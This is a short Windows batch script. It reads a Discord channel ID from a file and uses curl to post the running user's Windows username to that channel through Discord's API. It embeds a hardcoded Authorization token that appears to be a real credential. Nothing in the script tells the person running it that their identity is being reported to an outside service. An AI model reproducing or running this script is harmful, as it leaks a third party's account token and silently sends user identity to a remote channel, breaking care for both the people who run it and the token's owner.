@echo off
set /p channel=<channel.txt
curl ^
-v ^
-H "Authorization: MTE5OTAxNDc3MjE4NDczMTczNA.Gt4Jhx.ITfHock70PPBpFSihysGqIWMcfEewEuS0RHEKw" ^
-H "Content-Type: application/json" ^
-X POST ^
-d "{\"content\": \"oneline-user: %username%\"}" ^
https://discord.com/api/v9/channels/%channel%/messages
done.bat
